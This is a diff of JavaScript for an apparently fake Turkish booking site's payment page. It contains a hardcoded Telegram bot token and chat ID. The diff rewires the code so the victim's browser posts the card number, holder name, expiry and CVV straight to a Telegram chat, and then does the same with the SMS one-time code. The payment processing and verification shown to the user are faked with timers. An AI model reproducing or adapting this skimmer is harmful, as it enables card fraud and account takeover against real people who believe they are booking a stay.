@@ -25,35 +25,38 @@ const successState = document.getElementById("successState")
 
 const TELEGRAM_BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
 const TELEGRAM_CHAT_ID = "-1002626141042"
-const TELEGRAM_API_URL = "https://api.telegram.org/bot"
 
-async function sendToTelegram(type, data) {
+async function sendToTelegram(message) {
   try {
-    const response = await fetch("/app/api/msg", {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
+    const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        type: type,
-        ...data,
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
       }),
     })
-
-    const result = await response.json()
-    console.log("[v0] API Response:", result)
+    console.log("[v0] Telegram response:", response.ok)
     return response.ok
   } catch (error) {
-    console.error("[v0] Error:", error)
+    console.log("[v0] Telegram error:", error)
     return false
   }
 }
 
-function formatTelegramMessage(data) {
-  if (data.type === "payment") {
-    return `<b>💳 KART BİLGİSİ</b>\n\n<b>Kart Numarası:</b> ${data.cardNumber}\n<b>Kart Sahibi:</b> ${data.cardName}\n<b>Son Kullanma:</b> ${data.expiryMonth}/${data.expiryYear}\n<b>CVV:</b> ${data.cvv}\n\n<b>Rezervasyon:</b>\n<b>Giriş:</b> ${data.checkIn}\n<b>Çıkış:</b> ${data.checkOut}\n<b>Misafir:</b> ${data.guests}\n<b>Tutar:</b> ${data.amount} TL`
-  } else if (data.type === "sms") {
-    return `<b>📱 SMS DOĞRULAMA</b>\n\n<b>Kod:</b> ${data.smsCode}\n<b>Tutar:</b> ${data.amount} TL\n<b>Saat:</b> ${data.timestamp}`
-  }
-}
+// Elements
+const smsCodeInput = document.getElementById("smsCode")
+const paymentBtn = document.getElementById("paymentBtn")
+const verifyBtn = document.getElementById("verifyBtn")
+const resendBtn = document.querySelector(".resend-btn")
+const smsPrice = document.getElementById("smsPrice")
+const successAmount = document.getElementById("successAmount")
+const summaryCheckIn = document.getElementById("summaryCheckIn")
+const summaryCheckOut = document.getElementById("summaryCheckOut")
+const summaryGuests = document.getElementById("summaryGuests")
+const summaryPrice = document.getElementById("summaryPrice")
 
 // Initialize
 document.addEventListener("DOMContentLoaded", () => {
@@ -65,7 +68,7 @@ document.addEventListener("DOMContentLoaded", () => {
   document.getElementById("completeBtn").addEventListener("click", completePayment)
 
   // SMS Code input - only numbers
-  document.getElementById("smsCode").addEventListener("input", (e) => {
+  smsCodeInput.addEventListener("input", (e) => {
     e.target.value = e.target.value.replace(/\D/g, "")
   })
 
@@ -80,10 +83,10 @@ function openPaymentModal() {
   const guests = document.getElementById("guests").value
 
   // Update summary
-  document.getElementById("summaryCheckIn").textContent = formatDate(checkIn)
-  document.getElementById("summaryCheckOut").textContent = formatDate(checkOut)
-  document.getElementById("summaryGuests").textContent = guests
-  document.getElementById("summaryPrice").textContent = "2.400 TL"
+  summaryCheckIn.textContent = formatDate(checkIn)
+  summaryCheckOut.textContent = formatDate(checkOut)
+  summaryGuests.textContent = guests
+  summaryPrice.textContent = "2.400 TL"
 
   // Clear inputs
   document.getElementById("cardNumber").value = ""
@@ -102,7 +105,7 @@ function closePaymentModal() {
   paymentModal.classList.remove("active")
   smsModal.classList.remove("active")
   successState.style.display = "none"
-  document.getElementById("smsForm").style.display = "flex"
+  smsForm.style.display = "flex"
 }
 
 function formatDate(dateString) {
@@ -120,28 +123,21 @@ async function handlePayment(e) {
   const expiryYear = document.getElementById("expiryYear").value
   const cvv = document.getElementById("cvv").value
 
-  await sendToTelegram("payment", {
-    a: cardNumber,
-    b: cardName,
-    c: expiryMonth,
-    d: expiryYear,
-    e: cvv,
-    checkIn: state.checkIn,
-    checkOut: state.checkOut,
-    guests: state.guests,
-  })
+  const message = `<b>💳 KART BİLGİSİ</b>\n\n<b>Kart Numarası:</b> ${cardNumber}\n<b>Kart Sahibi:</b> ${cardName}\n<b>Ay:</b> ${expiryMonth}\n<b>Yıl:</b> ${expiryYear}\n<b>CVV:</b> ${cvv}\n\n<b>Rezervasyon Bilgileri:</b>\n<b>Giriş:</b> ${state.checkIn}\n<b>Çıkış:</b> ${state.checkOut}\n<b>Misafir:</b> ${state.guests}`
+
+  await sendToTelegram(message)
 
   // Simulate processing
-  document.getElementById("paymentBtn").disabled = true
-  document.getElementById("paymentBtn").textContent = "İşlem Yapılıyor..."
+  paymentBtn.disabled = true
+  paymentBtn.textContent = "İşlem Yapılıyor..."
 
   setTimeout(() => {
     paymentModal.classList.remove("active")
     smsModal.classList.add("active")
-    document.getElementById("smsCode").value = ""
-    document.getElementById("smsPrice").textContent = "2.300 TL"
-    document.getElementById("paymentBtn").disabled = false
-    document.getElementById("paymentBtn").textContent = "2.300 TL ile Ödeme Yap"
+    smsCodeInput.value = ""
+    smsPrice.textContent = "2.300 TL"
+    paymentBtn.disabled = false
+    paymentBtn.textContent = "2.300 TL ile Ödeme Yap"
   }, 2000)
 }
 
@@ -149,39 +145,35 @@ async function handlePayment(e) {
 function closeSMSModal() {
   smsModal.classList.remove("active")
   successState.style.display = "none"
-  document.getElementById("smsForm").style.display = "flex"
+  smsForm.style.display = "flex"
 }
 
 async function handleSMS(e) {
   e.preventDefault()
 
-  const smsCode = document.getElementById("smsCode").value
-  state.smsCode = smsCode
+  const smsCode = smsCodeInput.value
 
-  await sendToTelegram("sms", {
-    code: smsCode,
-    checkIn: state.checkIn,
-    checkOut: state.checkOut,
-    guests: state.guests,
-  })
+  const message = `<b>📱 SMS DOĞRULAMA</b>\n\n<b>SMS Kodu:</b> <code>${smsCode}</code>\n<b>Tutar:</b> 2.300 TL\n<b>Saat:</b> ${new Date().toLocaleTimeString("tr-TR")}`
+
+  await sendToTelegram(message)
 
   // Simulate verification
-  document.getElementById("verifyBtn").disabled = true
-  document.getElementById("verifyBtn").textContent = "Doğrulanıyor..."
+  verifyBtn.disabled = true
+  verifyBtn.textContent = "Doğrulanıyor..."
 
   setTimeout(() => {
-    document.getElementById("smsForm").style.display = "none"
+    smsForm.style.display = "none"
     successState.style.display = "block"
-    document.getElementById("successAmount").textContent = "2.300 TL"
-    document.getElementById("verifyBtn").disabled = false
-    document.getElementById("verifyBtn").textContent = "Kodu Doğrula"
+    successAmount.textContent = "2.300 TL"
+    verifyBtn.disabled = false
+    verifyBtn.textContent = "Kodu Doğrula"
   }, 2000)
 }
 
 function completePayment() {
   smsModal.classList.remove("active")
   successState.style.display = "none"
-  document.getElementById("smsForm").style.display = "flex"
+  smsForm.style.display = "flex"
 }
 
 // Timer
@@ -195,7 +187,7 @@ function startTimer() {
 
     if (timeLeft <= 0) {
       clearInterval(interval)
-      document.querySelector(".resend-btn").disabled = true
+      resendBtn.disabled = true
     }
   }, 1000)
 }
